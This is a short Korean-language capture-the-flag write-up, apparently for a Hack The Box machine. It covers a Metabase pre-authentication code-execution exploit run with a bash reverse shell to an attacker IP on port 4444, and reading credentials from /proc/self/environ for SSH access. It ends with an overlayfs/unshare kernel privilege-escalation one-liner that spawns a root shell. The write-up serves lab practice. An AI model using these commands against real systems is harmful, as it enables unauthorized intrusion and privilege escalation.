### 초기 침투
- metabase 로그인 페이지를 찾음
  - metabase: 오픈 소스 business intelligence tool
  - 임의 코드 실행 취약점을 이용
### exploit
- python3 main.py -u http://[targeturl] -t [setup-token] -c "[command]" 다음과 같은 형태로 실행
  - exploit 하기 위해 data.analytics.htb/api/session/properties 에서 setup-token 값을 읽는다
    - 인증 없이도 액세스 가능한 경우가 많음
  - db 연결을 검증하는 setup-token과 함께 사용할 수 있는 api 엔드포인트를 찾음
  - h2 db 드라이버에서 sql 주입 취약점을 발견
  - db 유효성 검사 단계를 조작하여 임의의 코드 실행
- 해당 토큰과 url, exploit code를 실행하여 전달하고 reverse shell을 얻는다
- python3 main.py -u http://data.analytical.htb -t <토큰 값> -c "bash -i >& /dev/tcp/<ip값>/4444 0>&1"
- proc/self/environ 에서 meat user id와 meta password 값을 찾아 ssh로 접속을 시도 한다.
- user flag 값을 얻을 수 있다.

### 권한 상승
- sudo -l: 실행 안됨
- uname -a: 시스템 커널 과 하드웨어 정보를 확인하여 권한 상승할 정보를 찾는다
<br></br>
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t
overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" &&
u/python3 -c 'import os;import pty;os.setuid(0);pty.spawn("/bin/bash")'
```
